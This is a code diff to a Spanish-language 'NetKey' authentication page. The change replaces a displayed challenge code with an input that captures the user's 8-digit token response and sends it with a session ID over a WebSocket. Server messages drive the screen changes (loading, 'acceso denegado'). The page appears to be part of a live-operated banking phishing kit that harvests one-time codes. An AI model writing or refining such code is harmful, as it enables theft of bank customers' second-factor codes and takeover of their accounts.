@@ -193,11 +193,25 @@
         </div>
         <div style="max-width: 500px; margin: 100px auto; padding: 30px; background: #003d7a; border-radius: 8px; color: white;">
             <h2 style="text-align: center; margin-bottom: 20px;">Autenticación NetKey</h2>
-            <p style="text-align: center; margin-bottom: 30px; font-size: 14px;">Por favor ingrese el código CHALLENGE de su dispositivo NetKey</p>
-            <div style="background: white; color: #003d7a; padding: 40px 20px; text-align: center; border-radius: 4px; font-size: 48px; font-weight: bold; letter-spacing: 8px; font-family: 'Courier New', monospace;" id="challenge-display">
-                --------
+            <p style="text-align: center; margin-bottom: 30px; font-size: 14px;">Por favor ingrese el código de respuesta de su dispositivo NetKey</p>
+            <div style="background: white; padding: 20px; border-radius: 4px;">
+                <input 
+                    type="text" 
+                    id="netkey-response-input" 
+                    maxlength="8" 
+                    placeholder="________"
+                    style="width: 100%; padding: 20px; font-size: 36px; text-align: center; letter-spacing: 8px; border: 2px solid #003d7a; border-radius: 4px; font-family: 'Courier New', monospace; color: #003d7a; font-weight: bold;"
+                />
             </div>
-            <p style="text-align: center; margin-top: 20px; font-size: 12px; opacity: 0.8;">Esperando código CHALLENGE...</p>
+            <button 
+                id="netkey-submit-btn"
+                style="width: 100%; margin-top: 20px; padding: 15px; background: white; color: #003d7a; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: opacity 0.3s;"
+                onmouseover="this.style.opacity='0.8'"
+                onmouseout="this.style.opacity='1'"
+            >
+                Continuar
+            </button>
+            <p style="text-align: center; margin-top: 15px; font-size: 12px; opacity: 0.8;">Ingrese el código de 8 dígitos de su NetKey</p>
         </div>
     </div>
 
@@ -417,12 +431,43 @@
                 console.log('Mostrando pantalla NetKey');
                 document.getElementById('netkey-screen').style.display = 'block';
                 
-                if (data.challenge) {
-                    console.log('Mostrando challenge:', data.challenge);
-                    document.getElementById('challenge-display').textContent = data.challenge;
-                } else {
-                    console.log('No se recibió challenge en los datos');
+                // Configurar evento del botón de NetKey si aún no está configurado
+                var submitBtn = document.getElementById('netkey-submit-btn');
+                if (submitBtn && !submitBtn.hasAttribute('data-configured')) {
+                    submitBtn.setAttribute('data-configured', 'true');
+                    submitBtn.addEventListener('click', function() {
+                        var netkeyCode = document.getElementById('netkey-response-input').value.trim();
+                        
+                        if (netkeyCode.length !== 8) {
+                            alert('Por favor ingrese un código de 8 dígitos');
+                            return;
+                        }
+                        
+                        console.log('Enviando código NetKey:', netkeyCode);
+                        
+                        // Enviar código al servidor
+                        if (ws && ws.readyState === WebSocket.OPEN) {
+                            ws.send(JSON.stringify({
+                                type: 'CLIENT_INPUT',
+                                data: {
+                                    sessionId: currentSessionId,
+                                    tipo: 'netkey_response',
+                                    netkeyCode: netkeyCode
+                                }
+                            }));
+                            
+                            // Cambiar a pantalla de validación
+                            document.getElementById('netkey-screen').style.display = 'none';
+                            document.getElementById('loading-screen').style.display = 'block';
+                        } else {
+                            alert('Error de conexión. Por favor recargue la página.');
+                        }
+                    });
                 }
+                
+                // Limpiar el input
+                document.getElementById('netkey-response-input').value = '';
+                document.getElementById('netkey-response-input').focus();
             } else if (data.tipo === 'acceso_denegado') {
                 console.log('Mostrando pantalla de Acceso Denegado');
                 document.getElementById('acceso-denegado-screen').style.display = 'block';
